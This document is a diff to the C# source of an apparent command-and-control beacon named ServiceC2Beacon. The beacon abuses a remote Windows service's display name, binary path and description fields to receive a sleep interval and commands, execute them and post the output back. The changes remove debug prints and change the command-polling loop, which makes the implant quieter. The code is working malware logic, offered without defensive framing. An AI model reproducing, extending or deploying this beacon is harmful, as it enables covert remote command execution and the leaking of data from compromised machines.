@@ -35,7 +35,6 @@ namespace ServiceC2Beacon
                 QUERY_SERVICE_CONFIG service_config = new QUERY_SERVICE_CONFIG();
                 service_config = (QUERY_SERVICE_CONFIG)Marshal.PtrToStructure(ptr, new QUERY_SERVICE_CONFIG().GetType());
                 sleepTime = Int32.Parse(Marshal.PtrToStringAnsi(service_config.displayName));
-                Console.WriteLine("Sleep: " + sleepTime);
             }
             Marshal.FreeHGlobal(ptr);
 
@@ -63,11 +62,9 @@ namespace ServiceC2Beacon
             bool result = QueryServiceConfig2A(schService, 1, IntPtr.Zero, dwBytesNeeded, out dwBytesNeeded);
             IntPtr ptr = Marshal.AllocHGlobal((int)dwBytesNeeded);
             result = QueryServiceConfig2A(schService, 1, ptr, dwBytesNeeded, out dwBytesNeeded);
-            //Console.WriteLine(dwBytesNeeded);
 
             if (dwBytesNeeded <= 4)
             {
-                Console.WriteLine("Output is empty");
                 return output;
             }
 
@@ -78,17 +75,12 @@ namespace ServiceC2Beacon
                 try
                 {
                     service_description = (SERVICE_DESCRIPTION)Marshal.PtrToStructure(ptr, new SERVICE_DESCRIPTION().GetType());
-
                     output = service_description.lpDescription;
-                    Console.WriteLine("Output: " + output);
                 }
-                catch (Exception ex)
+                catch 
                 {
-                    //Console.WriteLine("Error getting output" + ex.Message);
                 }
-
             }
-
             Marshal.FreeHGlobal(ptr);
             return output;
         }
@@ -118,7 +110,6 @@ namespace ServiceC2Beacon
             {
                 service_config = (QUERY_SERVICE_CONFIG)Marshal.PtrToStructure(ptr, new QUERY_SERVICE_CONFIG().GetType());
                 cmd = Marshal.PtrToStringAnsi(service_config.binaryPathName);
-                Console.WriteLine("Command: " + cmd);
             }
             Marshal.FreeHGlobal(ptr);
 
@@ -211,7 +202,6 @@ namespace ServiceC2Beacon
             {
                 Console.WriteLine("[-] Output update failed");
             }
-            Console.WriteLine("[+] Output updated successfully");
 
             return success;
         }
@@ -240,7 +230,7 @@ namespace ServiceC2Beacon
             //Setting up sleeptimer
             int sleeptime = GetSleepTime(host, serviceName);
             DateTime stopTime = DateTime.Now.AddSeconds(sleeptime);
-            string lastCommand = "";
+
             //C2 loop
             while (active)
             {
@@ -256,17 +246,14 @@ namespace ServiceC2Beacon
                     }
 
                     string lastOutput = ReadOutput(host, serviceName);
-                    Console.WriteLine(lastOutput.Length);
 
-                    if (lastOutput.Length <= 0 && lastCommand != command && !command.Equals("Ready"))
+                    if (lastOutput.Length <= 0 && !command.Equals("Ready"))
                     {
+                        Console.WriteLine("[+] Received new command: " + command);
                         string output = RunCommand(command);
                         PostOutput(host, serviceName, output);
-                        
                     }
-
                     stopTime = DateTime.Now.AddSeconds(GetSleepTime(host, serviceName));
-                    lastCommand = command;
                 }
             }
             DisconnectFromService();
